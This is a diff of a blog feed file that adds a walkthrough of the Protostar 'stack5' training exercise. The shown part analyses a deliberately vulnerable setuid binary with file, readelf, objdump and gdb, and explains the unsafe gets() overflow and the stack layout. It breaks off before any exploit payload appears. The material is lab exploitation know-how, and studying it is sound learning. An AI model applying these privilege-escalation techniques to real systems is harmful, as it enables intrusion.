@@ -1,2 +1,800 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2020-05-09T20:19:03-07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Cronop.io</title><subtitle>Naive, idealistic, unconventional and sensitive posts.
-</subtitle></feed>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2020-05-09T20:42:58-07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Cronop.io</title><subtitle>Naive, idealistic, unconventional and sensitive posts.
+</subtitle><entry><title type="html">Protostar - Stack 5</title><link href="http://localhost:4000/posts/2020-05-09-protostar-stack5/" rel="alternate" type="text/html" title="Protostar - Stack 5" /><published>2020-05-09T00:00:00-07:00</published><updated>2020-05-09T00:00:00-07:00</updated><id>http://localhost:4000/posts/protostar-stack5</id><content type="html" xml:base="http://localhost:4000/posts/2020-05-09-protostar-stack5/">&lt;h2 id=&quot;target-binary&quot;&gt;Target Binary&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Name&lt;/th&gt;
+      &lt;th&gt;Description&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;File&lt;/td&gt;
+      &lt;td&gt;stack5 (https://exploit-exercises.lains.space/protostar/)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;OS&lt;/td&gt;
+      &lt;td&gt;GNU/Linux 2.6.18&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Format&lt;/td&gt;
+      &lt;td&gt;setuid ELF 32-bit LSB executable&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ASLR&lt;/td&gt;
+      &lt;td&gt;Not enabled&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Stack canaries&lt;/td&gt;
+      &lt;td&gt;Not enabled&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;NX&lt;/td&gt;
+      &lt;td&gt;Not enabled&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Symbol data&lt;/td&gt;
+      &lt;td&gt;Available&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;walkthrough&quot;&gt;Walkthrough&lt;/h2&gt;
+
+&lt;h3 id=&quot;analyze-file&quot;&gt;Analyze file&lt;/h3&gt;
+
+&lt;p&gt;To obtain general information about the file, the &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; command was used on the target binary:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@protostar:/opt/protostar/bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file stack5
+stack5: setuid ELF 32-bit LSB executable, Intel 80386, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;uses shared libs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.18, not stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Some interesting facts about the file are:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;It has &lt;code class=&quot;highlighter-rouge&quot;&gt;setuid&lt;/code&gt; property which indicates that the program is run with the privileges of the owner. In this case, owner is root. So it can be used to escalate privileges.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 22612 Nov 24  2011 stack5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;The file is an &lt;code class=&quot;highlighter-rouge&quot;&gt;ELF 32-bit LSB executable, Intel 80386&lt;/code&gt;. Elf is the file format, 32-bit is the word size, LSB means that least significant bytes first (Little endian) and Intel 80386 (x86) is the instruction set used.&lt;/li&gt;
+  &lt;li&gt;The file has symbols, as indicated by the &lt;code class=&quot;highlighter-rouge&quot;&gt;not stripped&lt;/code&gt; attribute. This is particularly helpful as we can see the original variables and function names during the debug/analysis process.&lt;/li&gt;
+  &lt;li&gt;The file uses shared libraries, as it is dynamically linked. This means that it uses existing libraries in our system as part of its execution. This is helpful as it helps to identify common libraries used in the binary.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;By checking the program headers of our binary it is possible to see that the stack is marked as executable. This is an indication that we could use the stack to store arbitrary code that can be executed directly if control flow of the binary is hijacked (Arbitrary code execution is commonly used to gain control of a victim’s machine):&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;readelf &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; stack5
+...
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08048034 0x08048034 0x000e0 0x000e0 R E 0x4
+  INTERP         0x000114 0x08048114 0x08048114 0x00013 0x00013 R   0x1
+      &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Requesting program interpreter: /lib/ld-linux.so.2]
+  LOAD           0x000000 0x08048000 0x08048000 0x004a4 0x004a4 R E 0x1000
+  LOAD           0x0004a4 0x080494a4 0x080494a4 0x00108 0x00110 RW  0x1000
+  DYNAMIC        0x0004b8 0x080494b8 0x080494b8 0x000d0 0x000d0 RW  0x4
+  NOTE           0x000128 0x08048128 0x08048128 0x00044 0x00044 R   0x4
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Flags: R &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Read W &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Write E &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Execute
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;By running GDB on the binary multiple times, it is possible to appreciate that subsequent runs always show the same addresses for the &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; function stack. This means that ASLR (Address Space Layout Randomization) is disabled. This is useful since exploits that require to know specific addresses in the system can be used (such as stack overflow, ROP, etc…).&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Run 1:&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; r
+The program being debugged has been started already.
+Start it from the beginning? &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y or n&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; y
+Starting program: /opt/protostar/bin/stack5 &amp;lt; ~/in.txt
+
+Breakpoint 6, main &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1, &lt;span class=&quot;nv&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xbffff854&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at stack5/stack5.c:10
+10	&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;stack5/stack5.c
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;
+0xbffff750:	0xb7fd7ff4
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Run 2:&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; r
+The program being debugged has been started already.
+Start it from the beginning? &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y or n&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; y
+Starting program: /opt/protostar/bin/stack5 &amp;lt; ~/in.txt
+
+Breakpoint 6, main &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1, &lt;span class=&quot;nv&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xbffff854&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at stack5/stack5.c:10
+10	&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;stack5/stack5.c
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;
+0xbffff750:	0xb7fd7ff4
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;By observing a decompiled function of the program, it is possible to determine if the executable was compiled with stack protection (or stack canaries). As it will only show only the base pointer (EBP) pushed into the stack but nothing else.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@protostar:/opt/protostar/bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-dj&lt;/span&gt; .text stack5 | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A10&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;main&amp;gt;:&quot;&lt;/span&gt;
+080483c4 &amp;lt;main&amp;gt;:
+ 80483c4:	55                   	push   %ebp
+ 80483c5:	89 e5                	mov    %esp,%ebp
+ 
+ &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; A stack protected binary would have some stack guards here
+ &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; that would like something like this:
+ &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;mov    %fs:0x28,%rax     &amp;lt;- get guard variable value
+ &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;mov    %rax,-0x8&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rbp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   &amp;lt;- save guard variable on stack
+ 
+ 80483c7:	83 e4 f0             	and    &lt;span class=&quot;nv&quot;&gt;$0xfffffff0&lt;/span&gt;,%esp
+ 80483ca:	83 ec 50             	sub    &lt;span class=&quot;nv&quot;&gt;$0x50&lt;/span&gt;,%esp
+ 80483cd:	8d 44 24 10          	lea    0x10&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
+ 80483d1:	89 04 24             	mov    %eax,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 80483d4:	e8 0f ff ff ff       	call   80482e8 &amp;lt;gets@plt&amp;gt;
+ 
+ &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;Cont.
+ &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;xor    %eax,%eax
+ &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;mov    &lt;span class=&quot;nt&quot;&gt;-0x14&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rbp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
+ &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;mov    &lt;span class=&quot;nt&quot;&gt;-0x8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rbp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%rdx   &amp;lt;- move it to register
+ &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;xor    %fs:0x28,%rdx     &amp;lt;- check it against original
+ &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;je     40058e &amp;lt;main+0xX&amp;gt;
+ &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;callq  400440 &amp;lt;__stack_chk_fail@plt&amp;gt; &amp;lt;- Fail &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;stack was manipulated
+ 
+ 80483d9:	c9                   	leave  
+ 80483da:	c3                   	ret    
+ 80483db:	90                   	nop
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;analyze-symbols&quot;&gt;Analyze symbols&lt;/h3&gt;
+
+&lt;p&gt;We will list the functions available since symbols are not stripped.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; info functions
+All defined functions:
+
+File stack5/stack5.c:
+int main&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;int, char &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+Non-debugging symbols:
+0x08048298  _init
+0x080482d8  __gmon_start__
+0x080482d8  __gmon_start__@plt
+0x080482e8  gets
+0x080482e8  gets@plt
+0x080482f8  __libc_start_main
+0x080482f8  __libc_start_main@plt
+0x08048310  _start
+0x08048340  __do_global_dtors_aux
+0x080483a0  frame_dummy
+0x080483e0  __libc_csu_fini
+0x080483f0  __libc_csu_init
+0x0804844a  __i686.get_pc_thunk.bx
+0x08048450  __do_global_ctors_aux
+0x0804847c  _fini
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We also executed the next objdump command (-M intel to set intel flavor mode, -T to list the dynamic symbol table and -C to demangle the functions):&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$objdump&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; intel &lt;span class=&quot;nt&quot;&gt;-TC&lt;/span&gt; stack4
+DYNAMIC SYMBOL TABLE:
+00000000  w   D  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;UND&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;	00000000              __gmon_start__
+00000000      DF &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;UND&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;	00000000  GLIBC_2.0   gets
+00000000      DF &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;UND&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;	00000000  GLIBC_2.0   __libc_start_main
+00000000      DF &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;UND&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;	00000000  GLIBC_2.0   puts
+080484dc g    DO .rodata	00000004  Base        _IO_stdin_used
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;analyze-binary-flow&quot;&gt;Analyze binary flow&lt;/h3&gt;
+
+&lt;p&gt;It seems that there is not much going on in the binary. Not many functions except from &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;puts&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;. Let’s explore the main function to see the flow of the program.&lt;/p&gt;
+
+&lt;p&gt;Let’s run the program and break on the main function.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb stack5
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; b main
+Breakpoint 1 at 0x80483cd: file stack5/stack5.c, line 10.
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; r
+Starting program: /opt/protostar/bin/stack5 
+
+Breakpoint 1, main &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1, &lt;span class=&quot;nv&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xbffff854&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at stack5/stack5.c:10
+10	stack5/stack5.c: No such file or directory.
+	&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;stack5/stack5.c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s disassemble main, to see the flow of the program. First, we loaded the binary in gdb and set a breakpoint in the main function to disassemble it.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;disassembly-flavor intel
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; disassemble 
+Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main:
+0x080483c4 &amp;lt;main+0&amp;gt;:	push   ebp
+0x080483c5 &amp;lt;main+1&amp;gt;:	mov    ebp,esp
+0x080483c7 &amp;lt;main+3&amp;gt;:	and    esp,0xfffffff0
+0x080483ca &amp;lt;main+6&amp;gt;:	sub    esp,0x50
+0x080483cd &amp;lt;main+9&amp;gt;:	lea    eax,[esp+0x10]
+0x080483d1 &amp;lt;main+13&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],eax
+0x080483d4 &amp;lt;main+16&amp;gt;:	call   0x80482e8 &amp;lt;gets@plt&amp;gt;
+0x080483d9 &amp;lt;main+21&amp;gt;:	leave  
+0x080483da &amp;lt;main+22&amp;gt;:	ret    
+End of assembler dump.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s breakdown what is going on in the main function:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;The first four instructions correspond to the prologue of the function:
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;push   ebp               &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; This saves the previous base pointer to the stack
+mov    ebp,esp           &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; This sets the current base point to the current stack pointer value
+and    esp,0xfffffff0    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;This aligns the stack pointer to 16 bits.
+sub    esp,0x50          &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; This allocates &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;variables &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;this &lt;span class=&quot;k&quot;&gt;function in &lt;/span&gt;the stack.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;em&gt;*All x86 programs are 16-bit aligned. This is done since processor architectures have better performance on aligned memory. &lt;/em&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;The next three instructions correspond to a function call:
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lea    eax,[esp+0x10]        &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Calculates an address based of the stack pointer + 0x10
+mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],eax   &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Moves the calculation to the top of the stack.
+call   0x80482e8 &amp;lt;gets@plt&amp;gt;  &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Calls the gets &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;em&gt;* Calling convention for x86 executables is to put the arguments to a function in the top of the stack before the doing call.&lt;/em&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;From this we can appreciate that we are passing a pointer to SP + 0x10 as the argument to the &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; function.&lt;/p&gt;
+
+&lt;p&gt;We know that GLIBC_2.0 &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; has the following definition, which is inline to what we see in the disassembly:&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;The last two instructions are the epilog of the main function:
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x080483d9 &amp;lt;main+21&amp;gt;:	leave  &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Copies the ebp to the esp to restore the old ebp from the stack
+0x080483da &amp;lt;main+22&amp;gt;:	ret    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Updates instruction pointer from the stack and returns to caller.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;identify-the-vulnerability&quot;&gt;Identify the vulnerability&lt;/h3&gt;
+
+&lt;p&gt;In this case we know that &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; is an inherently unsafe function. &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; is supposed to read from stdin and copy the input into a buffer. The basic problem is that &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; doesn’t know the length of the buffer, so it continues reading until it finds a newline or encounters EOF, and may overflow the bounds of the buffer it was given to it.&lt;/p&gt;
+
+&lt;p&gt;From the disassembly we know that the buffer pointer we are passing is from the stack:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sub    esp,0x50          &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Allocates 0x50 bytes from the stack
+lea    eax,[esp+0x10]    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Gives a pointer that is at offset 0x10 from the top of our stack
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;*The behavior of stack (growing up or growing down) depends on the application binary interface (ABI) and how the call stack is organized. In this case, the stack grows downwards.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;A stack frame represents a function call in a regular program. A normal stack frame (this can vary depending on architecture) looks like the following:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;+--------------------+ 0x00000000
+|                    |
+| Unallocated        |
+| memory             |
+|                    |
+|                    |
+|                    |
++--------------------+ Top of the stack
+| Local variables    |
+|                    |
++--------------------+
+| Previous base      |
+| pointer            |
++--------------------+
+| Return pointer     |
+|                    |
++--------------------+
+|                    |
+|                    |
+|                    |
+| Previous stack     |
+| Frame              |
+|                    |
++--------------------+ 0xFFFFFFFF
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A stack frame gets created through the following steps:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Push the current instruction pointer (EIP) to the stack.
+&lt;strong&gt;Note&lt;/strong&gt; The current instruction pointer points to the next instruction to execute.&lt;/li&gt;
+  &lt;li&gt;Jump to the address where the callee implementation is in memory.&lt;/li&gt;
+  &lt;li&gt;Save the current base pointer (EBP) (which points to the top of the start stack frame of the caller).&lt;/li&gt;
+  &lt;li&gt;Store the current stack pointer (ESP) into the base pointer (EBP), since this is the start of the new stack frame.&lt;/li&gt;
+  &lt;li&gt;Allocate the local variables’ memory.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;In our case #1 and #2 are depicted in a single instruction which is &lt;code class=&quot;highlighter-rouge&quot;&gt;call&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;To illustrate this, let’s single-step through the &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; function call:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; si
+0x080483d4	10	&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;stack5/stack5.c &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;lt;main+16&amp;gt;
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; disassemble 
+Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main:
+0x080483c4 &amp;lt;main+0&amp;gt;:	push   ebp
+0x080483c5 &amp;lt;main+1&amp;gt;:	mov    ebp,esp
+0x080483c7 &amp;lt;main+3&amp;gt;:	and    esp,0xfffffff0
+0x080483ca &amp;lt;main+6&amp;gt;:	sub    esp,0x50
+0x080483cd &amp;lt;main+9&amp;gt;:	lea    eax,[esp+0x10]
+0x080483d1 &amp;lt;main+13&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],eax
+0x080483d4 &amp;lt;main+16&amp;gt;:	call   0x80482e8 &amp;lt;gets@plt&amp;gt;
